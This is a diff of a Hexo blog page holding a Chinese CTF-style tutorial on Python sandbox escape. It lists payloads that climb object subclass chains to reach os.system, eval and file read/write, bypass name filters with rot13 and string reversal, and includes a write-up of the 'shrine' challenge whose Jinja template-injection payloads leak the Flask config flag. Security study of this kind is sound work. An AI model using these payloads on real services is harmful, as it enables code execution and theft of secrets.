@@ -1,335 +1,341 @@
+
 <!DOCTYPE html>
-
-
-
-  
-
-
-<html class="theme-next muse use-motion" lang="zh">
-<head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform">
-<meta http-equiv="Cache-Control" content="no-siteapp">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
-
-
-
-
-  
-  
-  
-  
-
-  
+<html lang="zh-cn">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Hexo">
+    <title>python沙盒逃逸two - Hexo</title>
+    <meta name="author" content="John Doe">
     
     
-  
-
-  
-
-  
-
-  
-
-  
-
-  
     
-    
-    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
-  
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
-
-<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">
-
-
-  <meta name="keywords" content="Hexo, NexT">
-
-
-
-
-
-
-
-
-  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2">
-
-
-
-
-
-
-<meta name="description" content="特殊方法先学习几个方法 getattr __getattribute__  __init__  __globals__  __call__  f修饰符">
-<meta property="og:type" content="article">
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"articleBody":"特殊方法先学习几个方法\ngetattr __getattribute__  __init__  __globals__  __call__  f修饰符\n\n\nf修饰符12&gt;&gt;&gt; f'&#123;__import__(\"os\").system(\"ls\")&#125;'11.py  视频  下载\n\ngetattr(self,attr)触发条件：当获取不存在的对象成员时触发\n参数：self 接收当前对象 attr获取成员名称的字符串\n返回值：必须有值\n作用：为访问不存在的属性设置值\n __getattribute__ 无论何时都会在getattr()之前触发，如果 __getattribute__ 有返回值，就不会在触发getattr()\n__getattribute__ (self,attr)触发条件：调用对象成员时触发，无论是否存在\n参数：同getattr\n返回值：必须有值\n作用：在具有封装操作(私有化时)，为程序开部分访问权限使用\n__init__类实例创建后调用，用于实例化当前实例的一些属性\n__globals__以字典的形式返回函数所在的全局命名空间所定义的全局变量，和func_globals 功能差不多(就是返回当前空间下，能使用的模块，方法，属性的字典)\n__call__使实例能够像函数一样被调用\n__class__获取该实例所属的类\n__mro__返回类的继承顺序，元组形式\n1234&gt;&gt;&gt; ''.__class__.__mro__(&lt;type 'str'&gt;, &lt;type 'basestring'&gt;, &lt;type 'object'&gt;)&gt;&gt;&gt; ''.__class__.__mro__[-1]&lt;type 'object'&gt;\n\n__base__  __bases__获取该类所属的基类\n12345678&gt;&gt;&gt; &apos;&apos;.__class__.__base__&lt;type &apos;basestring&apos;&gt;&gt;&gt;&gt; [].__class__.__base__&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; [].__class__.__bases__(&lt;type &apos;object&apos;&gt;,)&gt;&gt;&gt; [].__class__.__bases__[0]&lt;type &apos;object&apos;&gt;\n\n函数名被过滤可以利用getattr getattribute + 编码绕过\n123456789&gt;&gt;&gt; __import__('os').__getattribute__('flfgrz'.encode('rot13'))('ls')11.py  视频  下载放几个payloadgetattr(__import__(\"os\"),'flfgrz'.encode('rot13'))('ls')getattr(__import__('os'),'metsys'[::-1])('ls')__import__('os').__getattribute__('metsys'[::-1])('ls')\n\n继承链1234&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__&lt;unbound method catch_warnings.__init__&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache']&lt;module 'linecache' from '/usr/lib/python2.7/linecache.pyc'&gt;\n\n来个脚本跑一下，能拿到更多的payload\n123456789101112131415#coding:utf-8search = 'os'   #也可以是其他你想利用的模块num = -1for i in ().__class__.__bases__[0].__subclasses__():    num += 1    try:        if search in i.__init__.__globals__.keys():            print(i, num)    except:        pass \"\"\"(&lt;class 'site._Printer'&gt;, 72)(&lt;class 'site.Quitter'&gt;, 77)\"\"\"\n\n放几个payload python2.x\n12345678910111213141516171819202122# 利用file()函数读取文件：（写类似）().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()# 执行系统命令：().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].os.system('ls')# 执行系统命令：().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").system(\"ls\")')# 重新载入__builtins__：().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__'](\"os\").system(\"ls\")#读文件().__class__.__bases__[0].__subclasses__()[40](r'C:\\1.php').read()#写文件().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')#执行任意命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls  /var/www/html\").read()' )# 利用 __getattibute__ 方法x = [x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'ca'+'tch_warnings'][0].__init__x.__getattribute__(\"func_global\"+\"s\")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s')\n\npython3 \n1234567().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__['system']('ls')().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[\"sys\"].modules[\"os\"].system(\"ls\")''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[\"sys\"].modules[\"os\"].system(\"ls\")[].__class__.__base__.__subclasses__()[127].__init__.__globals__['system']('ls')\n\neg一道ctf记录\n1234567891011121314151617181920212223242526import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index():    return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine):    def safe_jinja(s):        s = s.replace('(', '').replace(')', '')        blacklist = ['config', 'self']        return ''.join(['&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'.format(c) for c in blacklist]) + s    return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__':    app.run(debug=True)\n\n注入点在路径 /shrine/&lt;path:shrine&gt;\n过滤了()  并且把config self置为空\n要是没被处理 可以用\n1234567# confighttp://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;config&#125;&#125;# self# &#123;&#123;self&#125;&#125; =&gt; &lt;TemplateReference None&gt;http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;self.__dict__&#125;&#125;# ()http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']&#125;&#125;\n\npayload\n123/shrine/&#123;&#123;url_for.__globals__[&apos;current_app&apos;].config[&apos;FLAG&apos;]&#125;&#125;/shrine/&#123;&#123;get_flashed_messages.__globals__[&apos;current_app&apos;].config[&apos;FLAG&apos;]&#125;&#125;\n\n参考链接\nhttps://juejin.im/post/5a3de02af265da432653098d\nhttps://xz.aliyun.com/t/2308#toc-4\nhttps://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#i-7\n","dateCreated":"2019-09-13T21:35:24+08:00","dateModified":"2019-11-20T21:24:33+08:00","datePublished":"2019-09-13T21:35:24+08:00","description":"特殊方法先学习几个方法\ngetattr __getattribute__  __init__  __globals__  __call__  f修饰符","headline":"python沙盒逃逸two","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/13/python沙盒逃逸two/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"url":"http://yoursite.com/2019/09/13/python沙盒逃逸two/"}</script>
+    <meta name="description" content="特殊方法先学习几个方法 getattr __getattribute__  __init__  __globals__  __call__  f修饰符">
+<meta property="og:type" content="blog">
 <meta property="og:title" content="python沙盒逃逸two">
 <meta property="og:url" content="http://yoursite.com/2019/09/13/python沙盒逃逸two/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="特殊方法先学习几个方法 getattr __getattribute__  __init__  __globals__  __call__  f修饰符">
-<meta property="og:locale" content="zh">
+<meta property="og:locale" content="zh-cn">
 <meta property="og:updated_time" content="2019-11-20T13:24:33.154Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="python沙盒逃逸two">
 <meta name="twitter:description" content="特殊方法先学习几个方法 getattr __getattribute__  __init__  __globals__  __call__  f修饰符">
+    
+    
+        
+    
+    
+    
+    
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/style-6tgl0yz7lnfzkusrxanjzjinweinxlhwhjly7phr1vxoylo39j7uvbjbwsfg.min.css">
+    <!--STYLES END-->
+    
 
+    
 
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Muse',
-    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: true,
-    duoshuo: {
-      userId: '0',
-      author: 'Author'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-
-  <link rel="canonical" href="http://yoursite.com/2019/09/13/python沙盒逃逸two/">
-
-
-
-
-
-  <title>python沙盒逃逸two | Hexo</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+    
+        
+    
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh">
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
 
-  
-  
-    
-  
 
-  <div class="container sidebar-position-left page-post-detail ">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
     
 
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Hexo</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+<header id="header" data-behavior="4">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/ "
+            aria-label=""
+        >
+            Hexo
+        </a>
     </div>
-      
-        <p class="site-subtitle"></p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
+    
         
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
-            
-            Home
-          </a>
-        </li>
-      
+            <a
+                class="header-right-picture "
+                href="#about"
+                aria-label="打开链接: /#about"
+            >
         
-        <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
-            
-            Archives
-          </a>
-        </li>
-      
         
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
-            
-            Tags
-          </a>
-        </li>
-      
+        </a>
+    
+</header>
 
-      
-    </ul>
-  
+            <!-- Define author's picture -->
 
-  
+
+<nav id="sidebar" data-behavior="4">
+    <div class="sidebar-container">
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/"
+                            
+                            rel="noopener"
+                            title="首页"
+                        >
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">首页</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-categories"
+                            
+                            rel="noopener"
+                            title="分类"
+                        >
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">分类</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-tags"
+                            
+                            rel="noopener"
+                            title="标签"
+                        >
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">标签</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-archives"
+                            
+                            rel="noopener"
+                            title="归档"
+                        >
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">归档</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link open-algolia-search"
+                            href="#search"
+                            
+                            rel="noopener"
+                            title="搜索"
+                        >
+                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">搜索</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="#about"
+                            
+                            rel="noopener"
+                            title="关于"
+                        >
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">关于</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://github.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="GitHub"
+                        >
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="http://stackoverflow.com/users"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Stack Overflow"
+                        >
+                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Stack Overflow</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://twitter.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Twitter"
+                        >
+                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Twitter</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://facebook.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Facebook"
+                        >
+                        <i class="sidebar-button-icon fab fa-facebook" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Facebook</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://plus.google.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Google Plus"
+                        >
+                        <i class="sidebar-button-icon fab fa-google-plus" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Google Plus</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://www.linkedin.com/profile/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="LinkedIn"
+                        >
+                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">LinkedIn</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/mailto"
+                            
+                            rel="noopener"
+                            title="邮箱"
+                        >
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">邮箱</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/atom.xml"
+                            
+                            rel="noopener"
+                            title="RSS"
+                        >
+                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
 </nav>
 
-
-
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
             
-
-  <div id="posts" class="posts-expand">
+            <div id="main" data-behavior="4"
+                 class="
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
     
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/13/python沙盒逃逸two/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
     
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">python沙盒逃逸two</h1>
-        
-
+        <div class="post-header main-content-wrap text-left">
+    
+        <h1 class="post-title">
+            python沙盒逃逸two
+        </h1>
+    
+    
         <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-13T21:35:24+08:00">
-                2019-09-13
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
+    <time datetime="2019-09-13T21:35:24+08:00">
+	
+		    9月 13, 2019
+    	
+    </time>
     
+</div>
 
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
 
-      
-      
-
-      
-        <h2 id="特殊方法"><a href="#特殊方法" class="headerlink" title="特殊方法"></a>特殊方法</h2><p>先学习几个方法</p>
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <h2 id="特殊方法"><a href="#特殊方法" class="headerlink" title="特殊方法"></a>特殊方法</h2><p>先学习几个方法</p>
 <p>getattr __getattribute__  __init__  __globals__  __call__  f修饰符</p>
 <a id="more"></a>
 
@@ -384,330 +390,315 @@
 <p><a href="https://xz.aliyun.com/t/2308#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308#toc-4</a></p>
 <p><a href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#i-7" target="_blank" rel="noopener">https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#i-7</a></p>
 
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/09/13/Lamp-Security-CTF4/" rel="next" title="Lamp-Security-CTF4">
-                <i class="fa fa-chevron-left"></i> Lamp-Security-CTF4
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/09/14/CBC字节翻转/" rel="prev" title="CBC字节翻转">
-                CBC字节翻转 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
-  </div>
-
-
-          </div>
-          
-
-
-          
-  <div class="comments" id="comments">
-    
-  </div>
 
 
         </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
         
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview">
-            Overview
-          </li>
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/14/CBC字节翻转/"
+                    data-tooltip="CBC字节翻转"
+                    aria-label="上一篇: CBC字节翻转"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/13/Lamp-Security-CTF4/"
+                    data-tooltip="Lamp-Security-CTF4"
+                    aria-label="下一篇: Lamp-Security-CTF4"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
         </ul>
-      
-
-      <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="John Doe">
-          <p class="site-author-name" itemprop="name">John Doe</p>
-           
-              <p class="site-description motion-element" itemprop="description"></p>
-          
-        </div>
-        <nav class="site-state motion-element">
-
-          
-            <div class="site-state-item site-state-posts">
-              <a href="/archives/">
-                <span class="site-state-item-count">47</span>
-                <span class="site-state-item-name">posts</span>
-              </a>
-            </div>
-          
-
-          
-
-          
-
-        </nav>
-
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Diesen Beitrag teilen"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
         
-
-        <div class="links-of-author motion-element">
-          
-        </div>
-
-        
-        
-
-        
-        
-
-        
-
-
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
             
-              
             
-
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/13/python沙盒逃逸two/"
+                    title="分享到 Facebook"
+                    aria-label="分享到 Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#特殊方法"><span class="nav-number">1.</span> <span class="nav-text">特殊方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#f修饰符"><span class="nav-number">1.1.</span> <span class="nav-text">f修饰符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getattr-self-attr"><span class="nav-number">1.2.</span> <span class="nav-text">getattr(self,attr)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getattribute-self-attr"><span class="nav-number">1.3.</span> <span class="nav-text">__getattribute__ (self,attr)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#init"><span class="nav-number">1.4.</span> <span class="nav-text">__init__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#globals"><span class="nav-number">1.5.</span> <span class="nav-text">__globals__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call"><span class="nav-number">1.6.</span> <span class="nav-text">__call__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#class"><span class="nav-number">1.7.</span> <span class="nav-text">__class__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mro"><span class="nav-number">1.8.</span> <span class="nav-text">__mro__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#base-bases"><span class="nav-number">1.9.</span> <span class="nav-text">__base__  __bases__</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#函数名被过滤"><span class="nav-number">2.</span> <span class="nav-text">函数名被过滤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#继承链"><span class="nav-number">3.</span> <span class="nav-text">继承链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eg"><span class="nav-number">4.</span> <span class="nav-text">eg</span></a></li></ol></div>
             
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/13/python沙盒逃逸two/"
+                    title="分享到 Twitter"
+                    aria-label="分享到 Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/13/python沙盒逃逸two/"
+                    title="分享到 Google+"
+                    aria-label="分享到 Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
 
-          </div>
-        </section>
-      <!--/noindex-->
-      
 
-      
-
+        
+        
+            
+        
     </div>
-  </aside>
+</article>
 
 
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2020 John Doe. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/14/CBC字节翻转/"
+                    data-tooltip="CBC字节翻转"
+                    aria-label="上一篇: CBC字节翻转"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/13/Lamp-Security-CTF4/"
+                    data-tooltip="Lamp-Security-CTF4"
+                    aria-label="下一篇: Lamp-Security-CTF4"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Diesen Beitrag teilen"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
         
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2019</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">John Doe</span>
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/13/python沙盒逃逸two/"
+                    title="分享到 Facebook"
+                    aria-label="分享到 Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/13/python沙盒逃逸two/"
+                    title="分享到 Twitter"
+                    aria-label="分享到 Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/13/python沙盒逃逸two/"
+                    title="分享到 Google+"
+                    aria-label="分享到 Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
 </div>
